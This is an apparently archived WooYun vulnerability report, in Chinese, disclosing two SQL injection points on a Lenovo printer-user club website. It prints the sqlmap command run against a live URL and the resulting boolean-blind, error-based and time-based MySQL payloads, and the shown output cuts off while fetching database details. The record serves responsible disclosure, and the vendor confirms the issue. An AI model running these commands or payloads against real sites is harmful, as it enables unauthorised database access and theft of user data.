wybug_title: 联想某人气分站二处SQL注射漏洞（数万用户数据危急）
wybug_detail:
漏洞详情 披露状态：   									2013-12-27：	细节已通知厂商并且等待厂商处理中									2013-12-28：	厂商已经确认，细节仅向厂商公开									2014-01-07：	细节向核心白帽子及相关领域专家公开									2014-01-17：	细节向普通白帽子公开									2014-01-27：	细节向实习白帽子公开									2014-02-10：	细节向公众公开  简要描述： 联想8#某人气分站另外二处存在SQL注射漏洞（数万用户数据危急） 详细说明：  站点：http://lenovoprinterclub.com 联想打印用户俱乐部昨天复查的时候又找出2处存在SQL注入漏洞http://www.lenovoprinterclub.com/about_procontent.php?contentid=18http://www.lenovoprinterclub.com/newscontent.php?contentid=83[root@Hacker~]# Sqlmap sqlmap.py -u "http://www.lenovoprinterclub.com/newscontent.php?contentid=83" --dbs --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:42:33[14:42:33] [INFO] resuming back-end DBMS 'mysql'[14:42:33] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: contentid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: contentid=83 AND 2551=2551    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: contentid=83 AND (SELECT 3550 FROM(SELECT COUNT(*),CONCAT(0x3a6e79703a,(SELECT (CASE WHEN (3550=3550) THEN 1 ELSE 0 END)),0x3a7a6d6f3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: contentid=83 AND SLEEP(5)---[14:42:33] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.4.10back-end DBMS: MySQL 5.0[14:42:33] [INFO] fetching current user[14:42:33] [INFO] resumed: noteant@localhostcurrent user:    'noteant@localhost'[14:42:33] [INFO] fetching current wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-28 15:37 厂商回复： 感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞 最新状态： 暂无
